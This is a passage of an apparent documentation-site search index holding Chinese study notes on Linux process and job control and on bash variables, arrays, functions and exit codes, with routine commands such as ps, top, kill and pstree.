\u4fe1\u53f7\uff0c\u7236\u8fdb\u7a0b\u505a\u8d44\u6e90\u56de\u6536\u548c\u6536\u5c3e\u5de5\u4f5c\u3002\u4f46\u5982\u679c\u7236\u8fdb\u7a0b\u6ca1\u505a\u6536\u5c3e\u5de5\u4f5c\uff0c\u5bfc\u81f4\u8fdb\u7a0b\u7684\u8fdb\u7a0b\u63a7\u5236\u5757(PCB)\u4ecd\u9a7b\u7559\u5728\u5185\u5b58\u4e2d\uff0c\u5c31\u65f6\u50f5\u5c38\u8fdb\u7a0b\u3002 \u5982\u679c\u7236\u8fdb\u7a0b\u7ed3\u675f\uff0c\u672a\u80fd\u53ca\u65f6\u6536\u56de\u5b50\u8fdb\u7a0b\uff0c\u5b50\u8fdb\u7a0b\u79f0\u4e3a\u5b64\u513f\u8fdb\u7a0b\uff0c\u6210\u4e3ainit\u7684\u5b50\u8fdb\u7a0b\u3002 \u8fdb\u7a0b0\u662f\u5185\u6838\u521d\u59cb\u5316\uff0c\u521b\u5efaPID\u4e3a1\u7684init\u5b50\u8fdb\u7a0b\uff0c\u8fdb\u7a0b0\u5c31\u8f6c\u4e3a\u4ea4\u6362\u8fdb\u7a0b\uff08\u6216\u79f0\u7a7a\u95f2\u8fdb\u7a0b\uff09\uff0cinit\u8fdb\u7a0b\u65f6\u7b2c\u4e00\u4e2a\u7528\u6237\u6001\u8fdb\u7a0b\u3002\uff08\u73b0\u88absystemd\u53d6\u4ee3\uff09 Session\u4e3b\u8981\u9488\u5bf9\u7ec8\u7aef\u5efa\u7acb\uff0cSession\u4e2d\u6bcf\u4e2a\u8fdb\u7a0b\u79f0\u4e3a\u4e00\u4e2a\u5de5\u4f5c\uff08job\uff09\u3002 \u547d\u4ee4\u672b\u5c3e\u52a0 & \u53ef\u4ee5\u4f7f\u5176\u540e\u53f0\u8fd0\u884c\u3002 Ctrl+z \u53ef\u4ee5\u5c06\u5de5\u4f5c\u5728\u540e\u53f0\u6302\u8d77\u3002 \u67e5\u770b\u540e\u53f0\u6302\u8d77\u7684\u5de5\u4f5c\uff1a jobs \uff0c\u56de\u663e\u4e2d\uff0c\u7b2c\u4e00\u5217\u4e3ajob\u7684\u7f16\u53f7\uff1b\u7b2c\u4e8c\u5217\u7684+\u8868\u793a\u6700\u8fd1\u88ab\u653e\u7f6e\u5230\u540e\u53f0\uff0c-\u8868\u793a\u5012\u6570\u7b2c\u4e8c\u3002 fg %job\u7f16\u53f7 \u53ef\u4ee5\u5c06\u540e\u53f0\u5de5\u4f5c\u7f6e\u4e8e\u524d\u53f0\uff0c\u82e5\u7701\u7565 %job\u7f16\u53f7 \u5219\u5bf9\u6807\u8bb0+\u7684\u5de5\u4f5c\u64cd\u4f5c\u3002\uff08\u5728bash\u4e2d\u53ef\u4ee5\u7701\u7565 % \uff09 bg %job\u7f16\u53f7 \u53ef\u4ee5\u4f7f\u5de5\u4f5c\u5728\u540e\u53f0\u8fd0\u884c\u3002 kill -\u4fe1\u53f7\u503c %job\u7f16\u53f7 \u53ef\u4ee5\u6740\u6389\u5de5\u4f5c\u3002 \u4fe1\u53f7\u503c \u4f5c\u7528 1 \u91cd\u65b0\u8bfb\u53d6\u53c2\u6570\u8fd0\u884c\uff0c\u7c7b\u4f3c\u4e8erestart 2 \u5982\u540cCtrl+c\u7684\u64cd\u4f5c\u9000\u51fa 9 \u5f3a\u5236\u7ec8\u6b62 15 \u4ee5\u6b63\u5e38\u7684\u65b9\u5f0f\u7ec8\u6b62\uff08\u9ed8\u8ba4\uff09 CPU\u5e73\u5747\u8d1f\u8f7d\uff1a top \u6216 htop \u7684\u56de\u663e\u91ccLoad average\u6307\u7684\u65f6CPU\u57281, 5, 15\u5206\u949f\u5185\u7684\u5e73\u5747\u8d1f\u8f7d\u3002\u6bcf\u4e2aCPU\u6838\u5fc3\u7684\u5e73\u5747\u8d1f\u8f7d\u7684\u4e34\u754c\u503c\u9ed8\u8ba4\u4e3a1\u3002 # \u67e5\u770b\u7269\u7406CPU\u7684\u4e2a\u6570 $ cat /proc/cpuinfo | grep \"physical id\" | sort | uniq | wc -l # \u67e5\u770b\u6bcf\u4e2aCPU\u7684\u6838\u5fc3\u6570 $ cat /proc/cpuinfo | grep \"physical id\" | grep \"0\" | wc -l top \u4e2d\u5217\u7684\u542b\u4e49\uff1a PR \u52a8\u6001\u4f18\u5148\u7ea7\uff08\u53d6\u503c\u8303\u56f40\\~139\uff09\uff1b NI nice\u503c\uff0c\u9759\u6001\u4f18\u5148\u7ea7\uff08\u53d6\u503c\u8303\u56f420\\~19\uff09\u3002\u4f18\u5148\u7ea7\u7684\u503c\u8d8a\u5c0f\uff0c\u4f18\u5148\u7ea7\u8d8a\u9ad8\u3002 VIRT , RES , SHR \u865a\u62df\u5185\u5b58\u7533\u8bf7\u91cf\uff0c\u7269\u7406\u5185\u5b58\u4f7f\u7528\u91cf\uff08\u9a7b\u7559\u5185\u5b58\u91cf\uff09\uff0c\u5171\u4eab\u5185\u5b58\u91cf \u5feb\u6377\u952e\uff1a M \u6839\u636e\u9a7b\u7559\u5185\u5b58\u6392\u5e8f\uff1b P \u6839\u636eCPU\u4f7f\u7528\u767e\u5206\u6bd4\u6392\u5e8f\uff1b T \u6839\u636e\u65f6\u95f4\u6392\u5e8f I \u5207\u6362\u663e\u793a\u5355\u6838\u5e73\u5747\u8d1f\u8f7d\u548cCPU\u5e73\u5c40\u8d1f\u8f7d\uff0c i \u5ffd\u7565\u95f2\u7f6e\u548c\u50f5\u5c38\u8fdb\u7a0b ps \u5e38\u7528\u547d\u4ee4\uff1a $ ps aux $ ps axjf","title":"Linux \u8fdb\u7a0b\u4e0e\u5de5\u4f5c"},{"location":"week01/Linux\u8fdb\u7a0b\u4e0e\u5de5\u4f5c/#linux","text":"\u67e5\u770b\u8fdb\u7a0b\u6811\uff1a pstree -A \u8fdb\u7a0b\u6811\u4ee5ASCII\u5b57\u7b26\u8fde\u63a5 -p \u540c\u65f6\u5217\u51fa\u6bcf\u4e2a\u8fdb\u7a0b\u7684PID -u \u540c\u65f6\u5217\u51fa\u6bcf\u4e2a\u8fdb\u7a0b\u7684\u6240\u5c5e\u8d26\u6237 \u5b50\u8fdb\u7a0b\u8981\u6b63\u5e38\u7ec8\u6b62\u65f6\uff0c\u6216\u8be5\u8fdb\u7a0b\u7ed3\u675f\u65f6\uff0c\u4f1a\u5411\u7236\u8fdb\u7a0b\u4f20\u9012\u4e00\u4e2a SIGCHLD \u4fe1\u53f7\uff0c\u7236\u8fdb\u7a0b\u505a\u8d44\u6e90\u56de\u6536\u548c\u6536\u5c3e\u5de5\u4f5c\u3002\u4f46\u5982\u679c\u7236\u8fdb\u7a0b\u6ca1\u505a\u6536\u5c3e\u5de5\u4f5c\uff0c\u5bfc\u81f4\u8fdb\u7a0b\u7684\u8fdb\u7a0b\u63a7\u5236\u5757(PCB)\u4ecd\u9a7b\u7559\u5728\u5185\u5b58\u4e2d\uff0c\u5c31\u65f6\u50f5\u5c38\u8fdb\u7a0b\u3002 \u5982\u679c\u7236\u8fdb\u7a0b\u7ed3\u675f\uff0c\u672a\u80fd\u53ca\u65f6\u6536\u56de\u5b50\u8fdb\u7a0b\uff0c\u5b50\u8fdb\u7a0b\u79f0\u4e3a\u5b64\u513f\u8fdb\u7a0b\uff0c\u6210\u4e3ainit\u7684\u5b50\u8fdb\u7a0b\u3002 \u8fdb\u7a0b0\u662f\u5185\u6838\u521d\u59cb\u5316\uff0c\u521b\u5efaPID\u4e3a1\u7684init\u5b50\u8fdb\u7a0b\uff0c\u8fdb\u7a0b0\u5c31\u8f6c\u4e3a\u4ea4\u6362\u8fdb\u7a0b\uff08\u6216\u79f0\u7a7a\u95f2\u8fdb\u7a0b\uff09\uff0cinit\u8fdb\u7a0b\u65f6\u7b2c\u4e00\u4e2a\u7528\u6237\u6001\u8fdb\u7a0b\u3002\uff08\u73b0\u88absystemd\u53d6\u4ee3\uff09 Session\u4e3b\u8981\u9488\u5bf9\u7ec8\u7aef\u5efa\u7acb\uff0cSession\u4e2d\u6bcf\u4e2a\u8fdb\u7a0b\u79f0\u4e3a\u4e00\u4e2a\u5de5\u4f5c\uff08job\uff09\u3002 \u547d\u4ee4\u672b\u5c3e\u52a0 & \u53ef\u4ee5\u4f7f\u5176\u540e\u53f0\u8fd0\u884c\u3002 Ctrl+z \u53ef\u4ee5\u5c06\u5de5\u4f5c\u5728\u540e\u53f0\u6302\u8d77\u3002 \u67e5\u770b\u540e\u53f0\u6302\u8d77\u7684\u5de5\u4f5c\uff1a jobs \uff0c\u56de\u663e\u4e2d\uff0c\u7b2c\u4e00\u5217\u4e3ajob\u7684\u7f16\u53f7\uff1b\u7b2c\u4e8c\u5217\u7684+\u8868\u793a\u6700\u8fd1\u88ab\u653e\u7f6e\u5230\u540e\u53f0\uff0c-\u8868\u793a\u5012\u6570\u7b2c\u4e8c\u3002 fg %job\u7f16\u53f7 \u53ef\u4ee5\u5c06\u540e\u53f0\u5de5\u4f5c\u7f6e\u4e8e\u524d\u53f0\uff0c\u82e5\u7701\u7565 %job\u7f16\u53f7 \u5219\u5bf9\u6807\u8bb0+\u7684\u5de5\u4f5c\u64cd\u4f5c\u3002\uff08\u5728bash\u4e2d\u53ef\u4ee5\u7701\u7565 % \uff09 bg %job\u7f16\u53f7 \u53ef\u4ee5\u4f7f\u5de5\u4f5c\u5728\u540e\u53f0\u8fd0\u884c\u3002 kill -\u4fe1\u53f7\u503c %job\u7f16\u53f7 \u53ef\u4ee5\u6740\u6389\u5de5\u4f5c\u3002 \u4fe1\u53f7\u503c \u4f5c\u7528 1 \u91cd\u65b0\u8bfb\u53d6\u53c2\u6570\u8fd0\u884c\uff0c\u7c7b\u4f3c\u4e8erestart 2 \u5982\u540cCtrl+c\u7684\u64cd\u4f5c\u9000\u51fa 9 \u5f3a\u5236\u7ec8\u6b62 15 \u4ee5\u6b63\u5e38\u7684\u65b9\u5f0f\u7ec8\u6b62\uff08\u9ed8\u8ba4\uff09 CPU\u5e73\u5747\u8d1f\u8f7d\uff1a top \u6216 htop \u7684\u56de\u663e\u91ccLoad average\u6307\u7684\u65f6CPU\u57281, 5, 15\u5206\u949f\u5185\u7684\u5e73\u5747\u8d1f\u8f7d\u3002\u6bcf\u4e2aCPU\u6838\u5fc3\u7684\u5e73\u5747\u8d1f\u8f7d\u7684\u4e34\u754c\u503c\u9ed8\u8ba4\u4e3a1\u3002 # \u67e5\u770b\u7269\u7406CPU\u7684\u4e2a\u6570 $ cat /proc/cpuinfo | grep \"physical id\" | sort | uniq | wc -l # \u67e5\u770b\u6bcf\u4e2aCPU\u7684\u6838\u5fc3\u6570 $ cat /proc/cpuinfo | grep \"physical id\" | grep \"0\" | wc -l top \u4e2d\u5217\u7684\u542b\u4e49\uff1a PR \u52a8\u6001\u4f18\u5148\u7ea7\uff08\u53d6\u503c\u8303\u56f40\\~139\uff09\uff1b NI nice\u503c\uff0c\u9759\u6001\u4f18\u5148\u7ea7\uff08\u53d6\u503c\u8303\u56f420\\~19\uff09\u3002\u4f18\u5148\u7ea7\u7684\u503c\u8d8a\u5c0f\uff0c\u4f18\u5148\u7ea7\u8d8a\u9ad8\u3002 VIRT , RES , SHR \u865a\u62df\u5185\u5b58\u7533\u8bf7\u91cf\uff0c\u7269\u7406\u5185\u5b58\u4f7f\u7528\u91cf\uff08\u9a7b\u7559\u5185\u5b58\u91cf\uff09\uff0c\u5171\u4eab\u5185\u5b58\u91cf \u5feb\u6377\u952e\uff1a M \u6839\u636e\u9a7b\u7559\u5185\u5b58\u6392\u5e8f\uff1b P \u6839\u636eCPU\u4f7f\u7528\u767e\u5206\u6bd4\u6392\u5e8f\uff1b T \u6839\u636e\u65f6\u95f4\u6392\u5e8f I \u5207\u6362\u663e\u793a\u5355\u6838\u5e73\u5747\u8d1f\u8f7d\u548cCPU\u5e73\u5c40\u8d1f\u8f7d\uff0c i \u5ffd\u7565\u95f2\u7f6e\u548c\u50f5\u5c38\u8fdb\u7a0b ps \u5e38\u7528\u547d\u4ee4\uff1a $ ps aux $ ps axjf","title":"Linux\u8fdb\u7a0b\u4e0e\u5de5\u4f5c"},{"location":"week02/Bash\u5165\u95e8/","text":"Bash\u5165\u95e8 # \u67e5\u770b\u5f53\u524d\u4f7f\u7528\u7684shell $ echo $0 # \u67e5\u770b\u5f53\u524d\u7528\u6237\u9ed8\u8ba4\u4f7f\u7528\u7684shell $ echo $SHELL PS1 \u4e00\u7ea7\u63d0\u793a\u7b26\uff0c\u7b49\u5f85\u547d\u4ee4\u8f93\u5165\u65f6\u7684\u63d0\u793a\u7b26 PS1 \u4e8c\u7ea7\u63d0\u793a\u7b26\uff0c\u591a\u884c\u8f93\u5165\u63d0\u793a\u7b26 \u4e0a\u4e00\u6761\u547d\u4ee4\u7684\u9000\u51fa\u72b6\u6001\u53ef\u4ee5\u7528 $? \u53d8\u91cf\u6765\u83b7\u53d6\uff0c\u5e38\u89c1\u7684\u503c\uff1a 0\uff1a\u6210\u529f 1\uff1a\u672a\u77e5\u9519\u8bef 126\uff1a\u547d\u4ee4\u65e0\u6cd5\u6267\u884c 127\uff1a\u65e0\u6548\u547d\u4ee4 130\uff1a\u901a\u8fc7ctrl+c\u9000\u51fa \u811a\u672c\u4e2d\u63a7\u5236\u9000\u51fa\u72b6\u6001\uff1a exit \u72b6\u6001\u503c \uff0c\u9ed8\u8ba4\u72b6\u6001\u503c\u4e3a0","title":"Bash \u5165\u95e8"},{"location":"week02/Bash\u5165\u95e8/#bash","text":"# \u67e5\u770b\u5f53\u524d\u4f7f\u7528\u7684shell $ echo $0 # \u67e5\u770b\u5f53\u524d\u7528\u6237\u9ed8\u8ba4\u4f7f\u7528\u7684shell $ echo $SHELL PS1 \u4e00\u7ea7\u63d0\u793a\u7b26\uff0c\u7b49\u5f85\u547d\u4ee4\u8f93\u5165\u65f6\u7684\u63d0\u793a\u7b26 PS1 \u4e8c\u7ea7\u63d0\u793a\u7b26\uff0c\u591a\u884c\u8f93\u5165\u63d0\u793a\u7b26 \u4e0a\u4e00\u6761\u547d\u4ee4\u7684\u9000\u51fa\u72b6\u6001\u53ef\u4ee5\u7528 $? \u53d8\u91cf\u6765\u83b7\u53d6\uff0c\u5e38\u89c1\u7684\u503c\uff1a 0\uff1a\u6210\u529f 1\uff1a\u672a\u77e5\u9519\u8bef 126\uff1a\u547d\u4ee4\u65e0\u6cd5\u6267\u884c 127\uff1a\u65e0\u6548\u547d\u4ee4 130\uff1a\u901a\u8fc7ctrl+c\u9000\u51fa \u811a\u672c\u4e2d\u63a7\u5236\u9000\u51fa\u72b6\u6001\uff1a exit \u72b6\u6001\u503c \uff0c\u9ed8\u8ba4\u72b6\u6001\u503c\u4e3a0","title":"Bash\u5165\u95e8"},{"location":"week02/Bash\u51fd\u6570\u548c\u6570\u7ec4/","text":"Bash\u51fd\u6570\u548c\u6570\u7ec4 \u6570\u7ec4 \u6570\u7ec4\u7684\u5b9a\u4e49\u548c\u8d4b\u503c\uff1a # \u5b9a\u4e49\u6570\u7ec4\uff0c\u6570\u7ec4\u5143\u7d20\u7528\u7a7a\u683c\u9694\u5f00\uff0c\u7d22\u5f15\u4e3a\u6570\u5b57 arr=(a b c) # \u5b9a\u4e49\u5173\u8054\u6570\u7ec4\uff0c\u7d22\u5f15\u5199\u5728[ ]\u5185 arr=([a]=1 [b]=2 [c]=3) # \u8d4b\u503c arr[a]=5 # \u4f7f\u7528read\u5b9a\u4e49\uff0c-a \u6307\u5b9a\u5c06\u8f93\u5165\u5b58\u4e3a\u6570\u7ec4 read -a arr # \u4f7f\u7528declare\u5b9a\u4e49\uff0c-a \u5b9a\u4e49\u7d22\u5f15\u6570\u7ec4 -A \u5b9a\u4e49\u5173\u8054\u6570\u7ec4 declare -a arr=(a b c) ${arr[n]} \u67e5\u770b\u6307\u5b9a\u7d22\u5f15\u7684\u5143\u7d20 ${arr[*]} , ${arr[@]} \u6240\u6709\u5143\u7d20 ${!arr[*]} , ${!arr[@]} \u6240\u6709\u7d22\u5f15 ${arr[*]:m} , ${arr[@]:m} \u4ece\u7d22\u5f15m\u5f00\u59cb\u540e\u9762\u7684\u6240\u6709\u5143\u7d20 ${arr[*]:m:n} , ${arr[@]:m:n} \u4ece\u7d22\u5f15m\u5f00\u59cb\u540e\u9762\u7684n\u4e2a\u5143\u7d20 ${#arr[*]} , ${#arr[@]} \u6570\u7ec4\u5143\u7d20\u4e2a\u6570 \u5220\u9664\u6570\u7ec4\uff1a unset arr \u5220\u9664\u6570\u7ec4\u67d0\u4e2a\u5143\u7d20\uff1a unset arr[n] \u51fd\u6570 \u51fd\u6570\u5b9a\u4e49\uff1a # \u7b2c1\u79cd \u51fd\u6570\u540d(){ \u51fd\u6570\u4f53 } # \u7b2c2\u79cd function \u51fd\u6570\u540d(){ \u51fd\u6570\u4f53 } # \u7b2c3\u79cd function \u51fd\u6570\u540d { \u51fd\u6570\u4f53 } \u51fd\u6570\u5b9a\u4e49\u8981\u5728\u6267\u884c\u4e4b\u524d bash\u6267\u884c\u987a\u5e8f\uff1a\u7cfb\u7edf\u522b\u540d->\u51fd\u6570->\u7cfb\u7edf\u547d\u4ee4->\u53ef\u6267\u884c\u6587\u4ef6 \u5982\u679c\u5c06\u51fd\u6570\u653e\u5728\u72ec\u7acb\u7684\u6587\u4ef6\u4e2d\uff0c\u811a\u672c\u4f7f\u7528\u7684\u65f6\u5019\uff0c\u9700\u8981\u4f7f\u7528 source \u6216 . \u6765\u52a0\u8f7d \u51fd\u6570\u7684\u8c03\u7528\u65b9\u5f0f\uff1a \u51fd\u6570\u540d \u53c2\u6570\u5217\u8868 \u5b9a\u4e49\u5c40\u90e8\u53d8\u91cf\u8981\u4f7f\u7528 local \u4fee\u9970\uff0c\u5426\u5219\u51fd\u6570\u5916\u90e8\u53ef\u8bbf\u95ee\u8be5\u53d8\u91cf\u3002 \u53ef\u4ee5\u4f7f\u7528 return \u6765\u8fd4\u56de\u503c\uff0c\u82e5\u53ea\u6709 return \u6216\u65e0 return \u5219\u8fd4\u56de\u6700\u540e\u7684\u6267\u884c\u72b6\u6001","title":"Bash \u51fd\u6570\u548c\u6570\u7ec4"},{"location":"week02/Bash\u51fd\u6570\u548c\u6570\u7ec4/#bash","text":"","title":"Bash\u51fd\u6570\u548c\u6570\u7ec4"},{"location":"week02/Bash\u51fd\u6570\u548c\u6570\u7ec4/#_1","text":"\u6570\u7ec4\u7684\u5b9a\u4e49\u548c\u8d4b\u503c\uff1a # \u5b9a\u4e49\u6570\u7ec4\uff0c\u6570\u7ec4\u5143\u7d20\u7528\u7a7a\u683c\u9694\u5f00\uff0c\u7d22\u5f15\u4e3a\u6570\u5b57 arr=(a b c) # \u5b9a\u4e49\u5173\u8054\u6570\u7ec4\uff0c\u7d22\u5f15\u5199\u5728[ ]\u5185 arr=([a]=1 [b]=2 [c]=3) # \u8d4b\u503c arr[a]=5 # \u4f7f\u7528read\u5b9a\u4e49\uff0c-a \u6307\u5b9a\u5c06\u8f93\u5165\u5b58\u4e3a\u6570\u7ec4 read -a arr # \u4f7f\u7528declare\u5b9a\u4e49\uff0c-a \u5b9a\u4e49\u7d22\u5f15\u6570\u7ec4 -A \u5b9a\u4e49\u5173\u8054\u6570\u7ec4 declare -a arr=(a b c) ${arr[n]} \u67e5\u770b\u6307\u5b9a\u7d22\u5f15\u7684\u5143\u7d20 ${arr[*]} , ${arr[@]} \u6240\u6709\u5143\u7d20 ${!arr[*]} , ${!arr[@]} \u6240\u6709\u7d22\u5f15 ${arr[*]:m} , ${arr[@]:m} \u4ece\u7d22\u5f15m\u5f00\u59cb\u540e\u9762\u7684\u6240\u6709\u5143\u7d20 ${arr[*]:m:n} , ${arr[@]:m:n} \u4ece\u7d22\u5f15m\u5f00\u59cb\u540e\u9762\u7684n\u4e2a\u5143\u7d20 ${#arr[*]} , ${#arr[@]} \u6570\u7ec4\u5143\u7d20\u4e2a\u6570 \u5220\u9664\u6570\u7ec4\uff1a unset arr \u5220\u9664\u6570\u7ec4\u67d0\u4e2a\u5143\u7d20\uff1a unset arr[n]","title":"\u6570\u7ec4"},{"location":"week02/Bash\u51fd\u6570\u548c\u6570\u7ec4/#_2","text":"\u51fd\u6570\u5b9a\u4e49\uff1a # \u7b2c1\u79cd \u51fd\u6570\u540d(){ \u51fd\u6570\u4f53 } # \u7b2c2\u79cd function \u51fd\u6570\u540d(){ \u51fd\u6570\u4f53 } # \u7b2c3\u79cd function \u51fd\u6570\u540d { \u51fd\u6570\u4f53 } \u51fd\u6570\u5b9a\u4e49\u8981\u5728\u6267\u884c\u4e4b\u524d bash\u6267\u884c\u987a\u5e8f\uff1a\u7cfb\u7edf\u522b\u540d->\u51fd\u6570->\u7cfb\u7edf\u547d\u4ee4->\u53ef\u6267\u884c\u6587\u4ef6 \u5982\u679c\u5c06\u51fd\u6570\u653e\u5728\u72ec\u7acb\u7684\u6587\u4ef6\u4e2d\uff0c\u811a\u672c\u4f7f\u7528\u7684\u65f6\u5019\uff0c\u9700\u8981\u4f7f\u7528 source \u6216 . \u6765\u52a0\u8f7d \u51fd\u6570\u7684\u8c03\u7528\u65b9\u5f0f\uff1a \u51fd\u6570\u540d \u53c2\u6570\u5217\u8868 \u5b9a\u4e49\u5c40\u90e8\u53d8\u91cf\u8981\u4f7f\u7528 local \u4fee\u9970\uff0c\u5426\u5219\u51fd\u6570\u5916\u90e8\u53ef\u8bbf\u95ee\u8be5\u53d8\u91cf\u3002 \u53ef\u4ee5\u4f7f\u7528 return \u6765\u8fd4\u56de\u503c\uff0c\u82e5\u53ea\u6709 return \u6216\u65e0 return \u5219\u8fd4\u56de\u6700\u540e\u7684\u6267\u884c\u72b6\u6001","title":"\u51fd\u6570"},{"location":"week02/Bash\u53d8\u91cf/","text":"Bash\u53d8\u91cf shell\u53d8\u91cf\u7684\u7279\u6027\uff1a \u90fd\u662f\u5b57\u7b26\u4e32\uff0c\u4e0d\u9700\u8981\u58f0\u660e \u683c\u5f0f\uff1a \u53d8\u91cf\u540d=\u5b57\u7b26\u4e32 = \u4e24\u8fb9\u4e0d\u80fd\u6709\u7a7a\u683c \u5982\u679c\u53d8\u91cf\u7684\u503c\u4e2d\u5305\u542b\u7a7a\u683c\uff0c\u9700\u8981\u4f7f\u7528\u5f15\u53f7 \u4f7f\u7528\u547d\u4ee4\u7ed3\u679c\uff08\u547d\u4ee4\u66ff\u6362\uff09\uff1a `\u547d\u4ee4` $(\u547d\u4ee4) # \u5982\u679c\u9700\u8981\u5f15\u53f7\uff0c\u53ea\u80fd\u7528\u53cc\u5f15\u53f7 read \u53ef\u4ee5\u8bfb\u53d6\u6807\u51c6\u8f93\u5165\u5e76\u8d4b\u503c\u7ed9\u53d8\u91cf\u6216\u6570\u7ec4\uff1a # read [-s \u5173\u95ed\u56de\u663e] [-a \u6570\u7ec4] [-n \u8bfb\u53d6\u5b57\u7b26\u6570] [-p \u63d0\u793a\u7b26] [-t \u8d85\u65f6] [\u540d\u79f0 ...] declare \u53ef\u4ee5\u58f0\u660e\u53d8\u91cf\u5e76\u8d4b\u503c\uff1a -r \u8bbe\u7f6e\u53ea\u8bfb -l \u503c\u8f6c\u4e3a\u5c0f\u5199\uff1b -u \u503c\u8f6c\u4e3a\u5927\u5199 \u6269\u5c55\u53d8\u91cf \u8868\u8fbe\u5f0f \u8bf4\u660e ${var} \u7b49\u540c\u4e8e $var ${var:+word} \u82e5 $var \u4e0d\u4e3a\u7a7a\uff0c\u5219\u8fd4\u56de word ${var:-word} \u82e5 $var \u4e3a\u7a7a\uff0c\u5219\u8fd4\u56de word ${var:=word} \u82e5 $var \u4e3a\u7a7a\uff0c\u5219\u8fd4\u56de word \uff0c\u4e14 $var \u7684\u503c\u88ab\u8bbe\u4e3a word \uff08\u4f4d\u7f6e\u53d8\u91cf\u548c\u7279\u6b8a\u53d8\u91cf\u4e0d\u9002\u7528\uff09 ${var:?word} \u82e5 $var \u4e3a\u7a7a\uff0c\u5219 word \u4f5c\u4e3a\u6807\u51c6\u9519\u8bef\u8f93\u51fa \u7279\u6b8a\u53d8\u91cf $n \uff1a \u4f20\u9012\u7ed9\u811a\u672c\u6216\u51fd\u6570\u7684\u7b2cn\u4e2a\u53c2\u6570\uff1b\u82e5n>10\uff0c\u9700\u4f7f\u7528 ${n} $0 \uff1a \u5f53\u524d\u811a\u672c\u7684\u6587\u4ef6\u540d $# \uff1a \u4f20\u9012\u7ed9\u811a\u672c\u6216\u51fd\u6570\u7684\u53c2\u6570\u6570\u91cf $* \uff1a \u4f20\u9012\u7ed9\u811a\u672c\u6216\u51fd\u6570\u7684\u6240\u6709\u53c2\u6570\uff1b \"$*\" \u5c06\u6240\u6709\u53c2\u6570\u89c6\u4e3a\u4e00\u4e2a\u6574\u4f53 $@ \uff1a \u4f20\u9012\u7ed9\u811a\u672c\u6216\u51fd\u6570\u7684\u6240\u6709\u51fd\u6570 $? \uff1a \u4e0a\u4e00\u6761\u547d\u4ee4\u7684\u9000\u51fa\u72b6\u6001\u6216\u8fd4\u56de\u503c $$ \uff1a \u5f53\u524d\u6267\u884c\u7684shell\u811a\u672c\u7684\u8fdb\u7a0b\u53f7 $! \uff1a \u4e0a\u4e00\u4e2a\u5728\u540e\u53f0\u5de5\u4f5c\u7684\u8fdb\u7a0b\u7684\u8fdb\u7a0b\u53f7 $_ \uff1a \u4e0a\u4e00\u6761\u547d\u4ee4\u6216\u811a\u672c\u7684\u6700\u540e\u4e00\u4e2a\u53c2\u6570 \u5220\u9664\u53d8\u91cf\uff1a unset \u53d8\u91cf\u540d -f \u4ec5\u5220\u9664\u51fd\u6570 -v \u4ec5\u5220\u9664\u53d8\u91cf","title":"Bash \u53d8\u91cf"},{"location":"week02/Bash\u53d8\u91cf/#bash","text":"shell\u53d8\u91cf\u7684\u7279\u6027\uff1a \u90fd\u662f\u5b57\u7b26\u4e32\uff0c\u4e0d\u9700\u8981\u58f0\u660e \u683c\u5f0f\uff1a \u53d8\u91cf\u540d=\u5b57\u7b26\u4e32 = \u4e24\u8fb9\u4e0d\u80fd\u6709\u7a7a\u683c \u5982\u679c\u53d8\u91cf\u7684\u503c\u4e2d\u5305\u542b\u7a7a\u683c\uff0c\u9700\u8981\u4f7f\u7528\u5f15\u53f7 \u4f7f\u7528\u547d\u4ee4\u7ed3\u679c\uff08\u547d\u4ee4\u66ff\u6362\uff09\uff1a `\u547d\u4ee4` $(\u547d\u4ee4) # \u5982\u679c\u9700\u8981\u5f15\u53f7\uff0c\u53ea\u80fd\u7528\u53cc\u5f15\u53f7 read \u53ef\u4ee5\u8bfb\u53d6\u6807\u51c6\u8f93\u5165\u5e76\u8d4b\u503c\u7ed9\u53d8\u91cf\u6216\u6570\u7ec4\uff1a # read [-s \u5173\u95ed\u56de\u663e] [-a \u6570\u7ec4] [-n \u8bfb\u53d6\u5b57\u7b26\u6570] [-p \u63d0\u793a\u7b26] [-t \u8d85\u65f6] [\u540d\u79f0 ...] declare \u53ef\u4ee5\u58f0\u660e\u53d8\u91cf\u5e76\u8d4b\u503c\uff1a -r \u8bbe\u7f6e\u53ea\u8bfb -l \u503c\u8f6c\u4e3a\u5c0f\u5199\uff1b -u \u503c\u8f6c\u4e3a\u5927\u5199 \u6269\u5c55\u53d8\u91cf \u8868\u8fbe\u5f0f \u8bf4\u660e ${var} \u7b49\u540c\u4e8e $var ${var:+word} \u82e5 $var \u4e0d\u4e3a\u7a7a\uff0c\u5219\u8fd4\u56de word ${var:-word} \u82e5 $var \u4e3a\u7a7a\uff0c\u5219\u8fd4\u56de word ${var:=word} \u82e5 $var \u4e3a\u7a7a\uff0c\u5219\u8fd4\u56de word \uff0c\u4e14 $var \u7684\u503c\u88ab\u8bbe\u4e3a word \uff08\u4f4d\u7f6e\u53d8\u91cf\u548c\u7279\u6b8a\u53d8\u91cf\u4e0d\u9002\u7528\uff09 ${var:?word} \u82e5 $var \u4e3a\u7a7a\uff0c\u5219 word \u4f5c\u4e3a\u6807\u51c6\u9519\u8bef\u8f93\u51fa \u7279\u6b8a\u53d8\u91cf $n \uff1a \u4f20\u9012\u7ed9\u811a\u672c\u6216\u51fd\u6570\u7684\u7b2cn\u4e2a\u53c2\u6570\uff1b\u82e5n>10\uff0c\u9700\u4f7f\u7528 ${n} $0 \uff1a \u5f53\u524d\u811a\u672c\u7684\u6587\u4ef6\u540d $# \uff1a \u4f20\u9012\u7ed9\u811a\u672c\u6216\u51fd\u6570\u7684\u53c2\u6570\u6570\u91cf $* \uff1a \u4f20\u9012\u7ed9\u811a\u672c\u6216\u51fd\u6570\u7684\u6240\u6709\u53c2\u6570\uff1b \"$*\" \u5c06\u6240\u6709\u53c2\u6570\u89c6\u4e3a\u4e00\u4e2a\u6574\u4f53 $@ \uff1a \u4f20\u9012\u7ed9\u811a\u672c\u6216\u51fd\u6570\u7684\u6240\u6709\u51fd\u6570 $? \uff1a \u4e0a\u4e00\u6761\u547d\u4ee4\u7684\u9000\u51fa\u72b6\u6001\u6216\u8fd4\u56de\u503c $$ \uff1a \u5f53\u524d\u6267\u884c\u7684shell\u811a\u672c\u7684\u8fdb\u7a0b\u53f7 $! \uff1a \u4e0a\u4e00\u4e2a\u5728\u540e\u53f0\u5de5\u4f5c\u7684\u8fdb\u7a0b\u7684\u8fdb\u7a0b\u53f7 $_ \uff1a \u4e0a\u4e00\u6761\u547d\u4ee4\u6216\u811a\u672c\u7684\u6700\u540e\u4e00\u4e2a\u53c2\u6570 \u5220\u9664\u53d8\u91cf\uff1a unset \u53d8\u91cf\u540d -f \u4ec5\u5220\u9664\u51fd\u6570 -v 